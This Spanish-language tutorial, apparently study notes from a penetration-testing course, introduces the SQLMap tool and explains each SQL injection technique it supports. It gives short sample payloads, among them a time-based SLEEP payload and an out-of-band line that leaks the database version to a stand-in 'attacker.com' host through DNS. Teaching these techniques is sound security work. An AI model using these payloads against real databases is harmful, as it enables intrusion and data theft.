---
cover: >-
  https://images.unsplash.com/photo-1450101499163-c8848c66ca85?crop=entropy&cs=tinysrgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHNlYXJjaHwyfHxkZXNjcmlwdGlvbnxlbnwwfHx8fDE2Nzg1NzIzNzc&ixlib=rb-4.0.3&q=80
coverY: 0
---

# Descripcion general

[SQLMap ](https://github.com/sqlmapproject/sqlmap)es una herramienta de prueba de penetración gratuita y de código abierto escrita en Python que automatiza el proceso de detección y explotación de fallas de inyección SQL (SQLi). SQLMap se ha desarrollado continuamente desde 2006 y todavía se mantiene hoy.

```bash
activePort@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap viene con un potente motor de detección, numerosas funciones y una amplia gama de opciones y conmutadores para ajustar los muchos aspectos, como:

| Conexión de destino                        | Detección de inyección        | Huellas dactilares                                                   |
| ------------------------------------------ | ----------------------------- | -------------------------------------------------------------------- |
| Enumeración                                | Mejoramiento                  | Detección de protección y omisión mediante scripts de "manipulación" |
| Recuperación de contenido de base de datos | Acceso al sistema de archivos | Ejecución de los comandos del sistema operativo (SO)                 |



## <mark style="color:orange;">Instalación de SQLMap</mark>

SQLMap está preinstalado en su Pwnbox y en la mayoría de los sistemas operativos centrados en la seguridad.  SQLMap también se encuentra en muchas bibliotecas de distribuciones de Linux. Por ejemplo, en Debian, se puede instalar con:

```bash
activePort@htb[/htb]$ sudo apt install sqlmap
```

Si queremos instalar manualmente, podemos usar el siguiente comando en la terminal de Linux o la línea de comandos de Windows:

```bash
activePort@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Después de eso, SQLMap se puede ejecutar con:

```bash
activePort@htb[/htb]$ python sqlmap.py
```



## <mark style="color:orange;">Bases de datos compatibles</mark>

SQLMap tiene el mayor soporte para DBMS que cualquier otra herramienta de explotación de SQL. SQLMap es totalmente compatible con los siguientes DBMS:

| `MySQL`            | `Oracle`             | `PostgreSQL`       | `Microsoft SQL Server` |
| ------------------ | -------------------- | ------------------ | ---------------------- |
| `SQLite`           | `IBM DB2`            | `Microsoft Access` | `Firebird`             |
| `Sybase`           | `SAP MaxDB`          | `Informix`         | `MariaDB`              |
| `HSQLDB`           | `CockroachDB`        | `TiDB`             | `MemSQL`               |
| `H2`               | `MonetDB`            | `Apache Derby`     | `Amazon Redshift`      |
| `Vertica`, `Mckoi` | `Presto`             | `Altibase`         | `MimerSQL`             |
| `CrateDB`          | `Greenplum`          | `Drizzle`          | `Apache Ignite`        |
| `Cubrid`           | `InterSystems Cache` | `IRIS`             | `eXtremeDB`            |
| `FrontBase`        |                      |                    |                        |

El equipo de SQLMap también trabaja para agregar y admitir nuevos DBMS periódicamente.



## <mark style="color:orange;">Tipos de inyeccion de SQL admitidos</mark>

SQLMap es la única herramienta de prueba de penetración que puede detectar y explotar correctamente todos los tipos de SQLi conocidos. Vemos los tipos de inyecciones de SQL compatibles con SQLMap con el comando <mark style="color:orange;">`sqlmap -hh`</mark>:

```bash
activePort@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Los personajes de la técnica `BEUSTQ` se refiere a lo siguiente:

* `B`: ciego basado en booleanos
* `E`: basado en errores
* `U`: basado en consultas de unión
* `S`: consultas apiladas
* `T`: Ciego basado en el tiempo
* `Q`: consultas en línea



## <mark style="color:orange;">Inyección SQL ciega basada en booleanos</mark>

Ejemplo de <mark style="color:orange;">`Boolean-based blind SQL Injection`</mark>:

```sql
AND 1=1
```

`SQLMap` explota vulnerabilidades de inyección `SQL` ciega basadas en booleanos a través de la diferenciación de los resultados de consulta <mark style="color:orange;">TRUE</mark> de <mark style="color:orange;">FALSE</mark>, recuperando efectivamente 1 byte de información por solicitud. La diferenciación se basa en la comparación de las respuestas del servidor para determinar si la consulta `SQL` devuelve <mark style="color:orange;">TRUE</mark> o <mark style="color:orange;">FALSE</mark>. Esto va desde comparaciones difusas de contenido de respuesta sin procesar, códigos `HTTP`, títulos de páginas, texto filtrado y otros factores.

* Los resultados <mark style="color:orange;">`TRUE`</mark> se basan generalmente en respuestas que no presentan ninguna diferencia o una diferencia marginal con respecto a la respuesta habitual del servidor.
* Los resultados <mark style="color:orange;">`FALSE`</mark> se basan en respuestas con diferencias sustanciales respecto a la respuesta habitual del servidor.
* La <mark style="color:orange;">`inyección SQL ciega basada en booleanos`</mark> es considerada como el tipo de `SQLi` más común en aplicaciones web.



## <mark style="color:orange;">Inyeccion SQL basada en errores</mark>

Ejemplo de <mark style="color:orange;">`Error-based SQL Injection`</mark>:

```sql
AND GTID_SUBSET(@@version,0)
```

Si los errores del <mark style="color:orange;">`sistema de gestión de bases de datos (SGBD)`</mark> se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, existe la probabilidad de que puedan utilizarse para transportar los resultados de las consultas solicitadas. En tales casos, se utilizan cargas útiles especializadas para el DBMS actual, dirigidas a las funciones que causan comportamientos erróneos conocidos. SQLMap tiene la lista más completa de cargas útiles relacionadas y cubre la <mark style="color:orange;">`Inyección SQL basada en errores`</mark> para los siguientes SGBD:

| mysql                     | postgresql      | Oráculo  |
| ------------------------- | --------------- | -------- |
| Servidor SQL de Microsoft | Sybase          | Vertical |
| ibmdb2                    | pájaro de fuego | Monet DB |

El SQLi basado en errores se considera más rápido que todos los demás tipos, excepto el basado en consultas UNION, porque puede recuperar una cantidad limitada (por ejemplo, 200 bytes) de datos llamados "fragmentos" a través de cada solicitud.



## <mark style="color:orange;">UNION basado en consultas</mark>

Ejemplo de <mark style="color:orange;">`UNION query-based SQL Injection`</mark>:

```sql
UNION ALL SELECT 1,@@version,3
```

Con el uso de <mark style="color:orange;">`UNION`</mark>, generalmente es posible extender la consulta original (<mark style="color:orange;">`vulnerable`</mark>) con los resultados de las sentencias inyectadas. De esta forma, si los resultados de la consulta original se muestran como parte de la respuesta, el atacante puede obtener resultados adicionales de las sentencias inyectadas dentro de la propia respuesta de la página. Este tipo de inyección SQL se considera el más rápido, ya que, en el escenario ideal, el atacante sería capaz de extraer el contenido de toda la tabla de la base de datos de interés con una sola petición.



## <mark style="color:orange;">Consultas apiladas</mark>

Ejemplo de <mark style="color:orange;">`Stacked Queries`</mark>:

Apilar consultas SQL, también conocido como "piggy-backing", es la forma de inyectar declaraciones SQL adicionales después de la vulnerable. En caso de que exista un requisito para ejecutar declaraciones que no sean de consulta (por ejemplo, `INSERT`, `UPDATE`o `DELETE`), el apilamiento debe estar soportado por la plataforma vulnerable (p. ej., `Microsoft SQL Server`y `PostgreSQL` admitirlo por defecto). SQLMap puede usar dichas vulnerabilidades para ejecutar declaraciones que no sean de consulta ejecutadas en funciones avanzadas (por ejemplo, ejecución de comandos del sistema operativo) y recuperación de datos de manera similar a los tipos de SQLi ciegos basados ​​en el tiempo.



## <mark style="color:orange;">Inyección SQL ciega basada en el tiempo</mark>

Ejemplo de `Time-based blind SQL Injection`

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

El principio de la Inyección SQL ciega basada en tiempo es similar a la Inyección SQL ciega basada en booleanos, pero aquí el tiempo de respuesta se utiliza como fuente para la diferenciación entre VERDADERO o FALSO.

* La respuesta `TRUE` generalmente se caracteriza por la diferencia notable en el tiempo de respuesta en comparación con la respuesta normal del servidor.
* La respuesta `FALSE` debe resultar en un tiempo de respuesta indistinguible de los tiempos de respuesta regulares.

La Inyección SQL ciega basada en tiempo es considerablemente más lenta que la SQLi ciega basada en booleanos, ya que las consultas que resulten en TRUE retrasarían la respuesta del servidor. Este tipo de SQLi se utiliza en casos en los que la inyección SQL ciega basada en booleanos no es aplicable. Por ejemplo, en caso de que la sentencia SQL vulnerable sea una no-consulta (por ejemplo, INSERT, UPDATE o DELETE), ejecutada como parte de la funcionalidad auxiliar sin ningún efecto en el proceso de renderizado de la página, la SQLi basada en tiempo se utiliza por necesidad, ya que la Inyección SQL ciega basada en Booleanos no funcionaría realmente en este caso.



## <mark style="color:orange;">Consultas en linea</mark>

Ejemplo de `Inline Queries`:

```sql
SELECT (SELECT @@version) from
```

Este tipo de inyección incrustó una consulta dentro de la consulta original. Tal inyección de SQL es poco común, ya que necesita que la aplicación web vulnerable se escriba de cierta manera. Aún así, SQLMap también es compatible con este tipo de SQLi.



## <mark style="color:orange;">Inyección SQL fuera de banda</mark>

Ejemplo de <mark style="color:orange;">`Out-of-band SQL Injection`</mark>:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Este se considera uno de los tipos más avanzados de SQLi, utilizado en los casos en que todos los demás tipos no son compatibles con la aplicación web vulnerable o son demasiado lentos (por ejemplo, SQLi ciego basado en el tiempo). SQLMap admite SQLi fuera de banda a través de la "exfiltración de DNS", donde las consultas solicitadas se recuperan a través del tráfico de DNS.

Al ejecutar SQLMap en el servidor DNS para el dominio bajo control (por ejemplo, <mark style="color:orange;">`.attacker.com`</mark>), SQLMap puede realizar el ataque obligando al servidor a solicitar subdominios inexistentes (p. ej. <mark style="color:orange;">`foo.attacker.com`</mark>), dónde <mark style="color:orange;">`foo`</mark>sería la respuesta SQL que queremos recibir. SQLMap puede luego recopilar estas solicitudes de DNS erróneas y recopilar el <mark style="color:orange;">`foo`</mark>parte, para formar la respuesta SQL completa.
